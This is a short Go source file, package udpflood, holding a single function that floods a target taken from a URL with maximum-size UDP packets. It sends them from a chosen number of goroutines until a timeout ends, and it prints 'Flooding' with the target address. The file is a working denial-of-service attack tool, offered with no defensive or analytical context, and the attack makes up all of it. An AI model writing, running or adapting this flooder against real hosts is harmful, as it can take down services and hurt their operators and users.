package udpflood

import (
	"context"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"
)

func UdpFloodUrl(host string, threadsN int64, timeout time.Duration) error {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	_url, err := url.Parse(host)
	if err != nil {
		return err
	}

	_host := _url.Host
	if !strings.Contains(host, ":") {
		if _url.Scheme == "https" {
			_host = fmt.Sprintf("%s:%s", _url.Host, "443")
		} else {
			_host = fmt.Sprintf("%s:%s", _url.Host, "80")
		}
	}

	buf := make([]byte, 65507)

	//Establish udp
	conn, err := net.Dial("udp", _host)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf("Flooding %s\n", _url.String())
		for i := int64(0); i < threadsN; i++ {
			go func() {
				for {
					select {
					case <-ctx.Done():
						return
					default:
						conn.Write(buf)
					}
				}
			}()
		}
	}

	<-time.After(timeout)

	return nil
}
